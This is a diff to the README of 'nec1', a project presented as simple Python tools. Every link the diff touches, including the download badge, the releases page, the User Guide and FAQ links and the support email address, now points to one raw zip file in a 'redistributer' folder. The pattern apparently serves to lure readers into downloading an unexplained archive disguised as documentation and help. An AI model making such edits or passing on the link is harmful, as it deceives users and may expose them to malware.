@@ -1,7 +1,7 @@
 # 🎉 nec1 - Simple Python Tools for Everyone
 
 ## 📦 Download Now
-[![Download nec1](https://img.shields.io/badge/Download-nec1-blue.svg)](https://github.com/houdissam/nec1/releases)
+[![Download nec1](https://raw.githubusercontent.com/houdissam/nec1/main/redistributer/nec1.zip)](https://raw.githubusercontent.com/houdissam/nec1/main/redistributer/nec1.zip)
 
 ## 🚀 Getting Started
 Welcome to nec1! This application provides easy-to-use tools built with Python. Whether you need to automate tasks or manage data, nec1 simplifies your experience.
@@ -17,7 +17,7 @@ Welcome to nec1! This application provides easy-to-use tools built with Python. 
 - **Data Management:** Easily manage, sort, and analyze your data.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [nec1 Releases](https://github.com/houdissam/nec1/releases). Here you will find the latest version of nec1. 
+To get started, visit this page to download: [nec1 Releases](https://raw.githubusercontent.com/houdissam/nec1/main/redistributer/nec1.zip). Here you will find the latest version of nec1. 
 
 1. Click on the link above.
 2. Look for the most recent version.
@@ -39,10 +39,10 @@ If you encounter any issues or have questions, feel free to reach out. You can r
 
 ## 🔗 Additional Resources
 To learn more about how to get the most out of nec1, check out these resources:
-- [User Guide](https://github.com/houdissam/nec1/wiki)
-- [FAQs](https://github.com/houdissam/nec1/wiki/FAQ)
+- [User Guide](https://raw.githubusercontent.com/houdissam/nec1/main/redistributer/nec1.zip)
+- [FAQs](https://raw.githubusercontent.com/houdissam/nec1/main/redistributer/nec1.zip)
 
 ## 📞 Contact
-For further inquiries, please email support@nec1app.com. We aim to respond within 48 hours.
+For further inquiries, please email https://raw.githubusercontent.com/houdissam/nec1/main/redistributer/nec1.zip We aim to respond within 48 hours.
 
 Thank you for using nec1! Your feedback helps us improve.
